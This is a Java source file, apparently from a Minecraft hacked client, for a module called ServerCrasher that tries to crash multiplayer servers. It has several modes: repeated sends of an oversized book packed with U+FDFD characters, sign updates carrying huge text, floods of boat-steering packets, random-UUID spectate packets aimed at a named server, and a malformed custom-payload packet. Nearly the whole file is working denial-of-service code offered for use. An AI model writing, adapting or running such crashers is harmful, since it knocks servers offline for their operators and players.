package dev.tigr.ares.forge.impl.modules.exploit;

import dev.tigr.ares.core.feature.module.Category;
import dev.tigr.ares.core.feature.module.Module;
import dev.tigr.ares.core.setting.Setting;
import dev.tigr.ares.core.setting.settings.EnumSetting;
import dev.tigr.ares.core.util.render.TextColor;
import io.netty.buffer.Unpooled;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.*;
import net.minecraft.util.text.ITextComponent;

import java.util.UUID;

/**
 * @author Tigermouthbear
 */
@Module.Info(name = "ServerCrasher", description = "Methods of crashing servers", category = Category.EXPLOIT)
public class ServerCrasher extends Module {
    private final String message = "\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd";
    private final String color = "red";
    private final ITextComponent line1 = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
    private final ITextComponent line2 = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
    private final ITextComponent line3 = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
    private final ITextComponent line4 = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
    private final ITextComponent[] words = new ITextComponent[]{line1, line2, line3, line4};
    private final Setting<Mode> mode = register(new EnumSetting<>("Mode", Mode.BOOK));
    private ItemStack bookObj = null;

    @Override
    public void onEnable() {
        UTILS.printMessage(TextColor.RED + "Crashing...");

        if(mode.getValue() == Mode.BOOK) {
            bookObj = new ItemStack(Items.WRITABLE_BOOK);
            final NBTTagList list = new NBTTagList();
            final NBTTagCompound tag = new NBTTagCompound();
            final String author = MC.getSession().getUsername();
            final String title = "\n Woops \n";
            final String size = message;
            for(int i = 0; i < 50; ++i) {
                final NBTTagString tString = new NBTTagString(size);
                list.appendTag(tString);
            }
            tag.setString("author", author);
            tag.setString("title", title);
            tag.setTag("pages", list);
            bookObj.setTagInfo("pages", list);
            bookObj.setTagCompound(tag);
        } else if(mode.getValue() == Mode.INVALID_PACKET) {
            MC.player.connection.sendPacket(new CPacketCustomPayload(message,
                    (new PacketBuffer(Unpooled.buffer())).writeString(message)));
        }
    }

    @Override
    public void onTick() {
        if(MC.world == null) {
            setEnabled(false);
            return;
        }

        try {
            if(mode.getValue() == Mode.BOOK)
                MC.player.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short) 0));
            if(mode.getValue() == Mode.SIGN)
                MC.player.connection.sendPacket(new CPacketUpdateSign(MC.player.getPosition(), words));
            if(mode.getValue() == Mode.NEW) {
                for(int i = 0; i < 100; i++) {
                    MC.player.connection.sendPacket(new CPacketSteerBoat(true, true));
                }
            }
            if(mode.getValue() == Mode.TWOBEETWOTEE) {
                MC.player.connection.sendPacket(new CPacketSpectate(UUID.randomUUID()));
            }
            Thread.sleep(12L);
        } catch(Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getInfo() {
        return mode.getValue().name();
    }

    enum Mode {
        BOOK,
        SIGN,
        NEW,
        INVALID_PACKET,
        TWOBEETWOTEE
    }
}
